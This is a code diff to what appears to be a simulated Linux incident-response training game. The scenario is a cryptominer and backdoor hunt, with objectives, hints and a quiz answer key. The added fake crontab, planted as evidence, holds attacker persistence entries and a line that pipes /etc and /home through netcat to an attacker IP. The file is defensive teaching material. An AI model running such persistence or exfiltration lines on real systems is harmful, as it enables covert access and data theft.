@@ -7570,12 +7570,16 @@ CPU COMMANDS:
   mpstat                   # CPU statistics
 
 THREAT INDICATORS:
-  - Process using >90% CPU = potential miner
+  - Process using >90% CPU = potential cryptominer
   - Unknown process in /tmp = suspicious
-  - Netcat (nc) with persistent connection = C2
-  - Process name matches PID (e.g. "6666") = hiding
+  - Netcat (nc) with persistent connection = possible C2
+  - Outbound to port 4444 = common C2/meterpreter port
+  - @reboot in crontab = persistence mechanism
 
-ANSWER: Rogue PID is 6666 (xmrig cryptominer)
+NETWORK COMMANDS:
+  netstat -tunapl          # All connections with PIDs
+  ss -tunapl               # Modern netstat alternative
+  lsof -i                  # List open network files
 `
                 },
                 '/home/monitor/dashboards': {
@@ -7766,22 +7770,41 @@ ROOT CAUSE: Under investigation
                     type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 128,
                     content: '# Monitor .bashrc\nexport PS1="[monitor@OPS-CENTER]$ "\nalias ll="ls -la"\nalias topcpu="ps aux --sort=-%cpu | head"\n'
                 },
+                '/var/spool/cron/crontabs/nobody': {
+                    type: 'file', perms: '-rw-------', owner: 'nobody', group: 'crontab', size: 256,
+                    content: `# Malicious crontab installed by attacker
+# DO NOT EDIT - this is evidence for incident response
+
+# Persistence mechanism - backdoor starts on every reboot
+@reboot /tmp/.hidden/backdoor -d -p 4444 >/dev/null 2>&1
+
+# Cryptominer restarts every hour in case it gets killed
+0 * * * * /tmp/.hidden/xmrig --config=/tmp/.hidden/config.json >/dev/null 2>&1
+
+# Exfiltrate data daily at 3am
+0 3 * * * tar czf - /etc /home | nc 10.0.0.88 9999
+`
+                },
             },
 
             objectives: [
-                { id: 1, task: 'VIEW: Process List', hint: '$ ps aux', check: (cmd, state, output) => cmd.includes('ps') && output && output.includes('PID') },
-                { id: 2, task: 'MONITOR: Real-time View', hint: '$ top (or htop)', check: (cmd, state, output) => cmd.includes('top') || cmd.includes('htop') },
-                { id: 3, task: 'CHECK: Memory Usage', hint: '$ free -h', check: (cmd, state, output) => cmd.includes('free') && output && (output.includes('Mem') || output.includes('total')) },
-                { id: 4, task: 'VIEW: System Stats', hint: '$ vmstat or iostat', check: (cmd, state, output) => (cmd.includes('vmstat') || cmd.includes('iostat') || cmd.includes('iotop')) },
-                { id: 5, task: 'FIND: Suspicious Process', hint: 'Check alerts/suspicious_proc.txt', check: (cmd, state, output) => output && (output.includes('6666') || output.includes('xmrig') || output.includes('cryptominer')) },
+                { id: 1, task: 'RECON: Assess System Health', hint: 'Check uptime and load average → uptime', check: (cmd, state, output) => cmd.includes('uptime') && output && output.includes('load average') },
+                { id: 2, task: 'TRIAGE: Sort Processes by CPU', hint: 'Find top CPU consumers → ps aux --sort=-%cpu | head', check: (cmd, state, output) => cmd.includes('ps') && cmd.includes('sort') && cmd.includes('cpu') },
+                { id: 3, task: 'IDENTIFY: Locate Rogue PID', hint: 'Which PID is consuming 98%+ CPU?', check: (cmd, state, output) => output && output.includes('6666') },
+                { id: 4, task: 'NETWORK: Check Active Connections', hint: 'Look for suspicious outbound → netstat -tunapl or ss -tunapl', check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) && output && (output.includes('ESTABLISHED') || output.includes('LISTEN')) },
+                { id: 5, task: 'TIMELINE: Find Compromise Start', hint: 'When did CPU spike? → cat dashboards/cpu_history.log', check: (cmd, state, output) => output && output.includes('11:00') && output.includes('spike') },
+                { id: 6, task: 'INTEL: Identify C2 Server IP', hint: 'Check network anomaly alert for attacker IP', check: (cmd, state, output) => output && output.includes('10.0.0.88') },
+                { id: 7, task: 'CORRELATE: Review Incident Timeline', hint: 'Read the incident report → cat reports/incident_report.txt', check: (cmd, state, output) => output && output.includes('TIMELINE') && output.includes('11:05') },
+                { id: 8, task: 'PERSIST: Check Backdoor Mechanism', hint: 'How does attacker maintain access? Check alerts or sudo crontab -l -u nobody', check: (cmd, state, output) => output && (output.includes('@reboot') || output.includes('cron') || output.includes('persistence')) },
             ],
 
             insightPhase: {
                 enabled: true,
-                question: "What is the PID of the rogue cryptominer process?",
-                acceptedAnswers: ["6666", "PID 6666"],
-                hint: "Read the suspicious_proc.txt alert file for the rogue PID.",
-                hintAfterAttempts: 3
+                question: "What IP address and port is the C2 (Command & Control) server using? (format: IP:PORT)",
+                acceptedAnswers: ["10.0.0.88:4444", "10.0.0.88 4444", "10.0.0.88 port 4444"],
+                hint: "Check the network_anomaly.txt alert - look for the Destination field.",
+                wrongAnswerMessage: "Format: IP:PORT (e.g., 192.168.1.1:8080)",
+                hintAfterAttempts: 2
             },
 
             remoteHosts: null,
